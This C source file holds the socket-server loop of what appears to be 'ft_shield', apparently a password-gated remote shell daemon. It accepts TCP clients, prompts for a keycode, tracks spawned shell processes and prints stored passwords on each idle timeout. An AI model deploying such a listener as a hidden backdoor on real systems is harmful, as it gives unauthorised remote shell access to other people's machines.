#include "ft_shield.h"

void	create_server_socket(t_server *server)
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd == -1)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}


	int reuse = 1;
	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)
	{
		perror("setsockopt(SO_REUSEADDR)");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in server_addr;

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(LISTENING_PORT);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	if (listen(socket_fd, MAX_CONECTIONS) == -1)
	{
		perror("listen");
		exit(EXIT_FAILURE);
	}
	server->fd = socket_fd;
}


int	set_read_fdset(t_client *clients, fd_set *set, int server_fd)
{
	FD_ZERO(set);
	FD_SET(server_fd, set);

	int max_fd = server_fd;
	for (int fd = 0; fd < MAX_CONECTIONS; ++fd)
	{
		if (clients[fd].fd)
		{
			FD_SET(clients[fd].fd, set);
			if (clients[fd].fd > max_fd)
				max_fd = clients[fd].fd;
		}
	}
	return (max_fd);
}

void server_loop(t_server *s)
{
	t_client			*clients = s->clients;
	fd_set				rfds;
	
	struct sockaddr_in	address;
	int					addrlen = sizeof(address);

	while (1)
	{
		struct timeval tv = {.tv_sec = 1, .tv_usec = 0};
		
		int max_fd = set_read_fdset(clients, &rfds, s->fd);

		int retval = select(max_fd + 1, &rfds, NULL, NULL, &tv);
		dprintf(2, "ret select %d\n", retval);
		if (retval == -1)
		{
			perror("select");
		}
		else if (retval != 0)
		{
			if (FD_ISSET(s->fd, &rfds))
			{
				int	client_fd;
				if ((client_fd = accept(s->fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
				{
					perror("accept");
					continue;
				}
				if (s->nbr_clients == MAX_NBR_CLIENTS)
				{
					send(client_fd, MANY_CLIENTS, sizeof(MANY_CLIENTS), 0);
					dprintf(2, "Connection denied, to many clients\n");
					close(client_fd);
					continue;
				}
				// 5. Extract IP and port from client_addr
				char client_ip[200] = {0};
				inet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);
				int client_port = ntohs(address.sin_port);

				dprintf(2, "Accepted connection from %s:%d\n", client_ip, client_port);
				s->nbr_clients++;
				clients[client_fd].fd = client_fd;
				dprintf(2, "New client accepted %d\n", client_fd);
				if (clients[client_fd].status == HANDSHAKE)
					send(client_fd, "Keycode: ", 10, 0);
			}

			for (int fd = 0; fd <= max_fd; ++fd)
			{
				int c_fd = clients[fd].fd;
				if (c_fd && FD_ISSET(c_fd, &rfds))
				{

					char buffer[1024] = {0};

					int ret_read = read(c_fd, buffer, sizeof(buffer) - 1);
					if (ret_read < 0)
					{
						perror("recv");
						continue;
					}
					else if (ret_read == 0)
					{
						dprintf(2, "Connection closed %d\n", c_fd);
						close(c_fd);
						memset(&clients[fd], 0, sizeof(t_client));
						s->nbr_clients--;
						continue;
					}
					else
					{
						handle_input(s, fd, buffer);
					}
					if (clients[fd].status == HANDSHAKE)
						send(c_fd, "Keycode: ", 10, 0);
				}
			}
		}
		else
		{
			t_list *aux = s->passwords;
			int i = 0;
			while (aux)
			{
				printf("password %d - %s\n", i, (char *)aux->content);
				i++;
				aux = aux->next;
			}
			ft_delete_node_if_true(s, &s->pids, shell_was_closed);
		}
	}
}

void	ft_server(t_server *server)
{
	create_server_socket(server);

	server_loop(server);
}
